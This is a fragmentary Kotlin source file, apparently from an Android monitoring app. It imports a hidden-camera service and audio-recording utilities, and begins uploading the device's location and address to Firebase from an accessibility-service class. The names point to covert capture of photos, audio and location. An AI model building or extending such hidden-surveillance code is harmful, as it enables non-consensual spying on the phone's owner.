...
import com.github.sdt.cypher.data.model.Photo
import com.github.sdt.cypher.data.model.Recording
...
import com.github.sdt.cypher.utils.Consts.KEY_TEXT
...
import com.github.sdt.cypher.utils.FileHelper.getFileNameAudio
import com.github.sdt.cypher.utils.FileHelper.getFilePath
import com.github.sdt.cypher.utils.MediaRecorderUtils
import com.github.sdt.cypher.utils.MyCountDownTimer
import com.github.sdt.cypher.utils.hiddenCameraServiceUtils.CameraCallbacks
import com.github.sdt.cypher.utils.hiddenCameraServiceUtils.CameraConfig
import com.github.sdt.cypher.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_CAMERA_PERMISSION_NOT_AVAILABLE
import com.github.sdt.cypher.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_DOES_NOT_HAVE_OVERDRAW_PERMISSION
import com.github.sdt.cypher.utils.hiddenCameraServiceUtils.CameraError.Companion.ERROR_IMAGE_WRITE_FAILED
import com.github.sdt.cypher.utils.hiddenCameraServiceUtils.HiddenCameraService
import com.github.sdt.cypher.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.github.sdt.cypher.utils.hiddenCameraServiceUtils.config.CameraRotation
...
class InteractorAccessibilityData @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceAccessibility, CameraCallbacks {
    ...
    override fun setDataLocation(location: Location) {
        if (firebase.getUser() != null) {
            ...
            val model = com.github.sdt.cypher.data.model.Location(location.latitude, location.longitude, address, getDateTime())
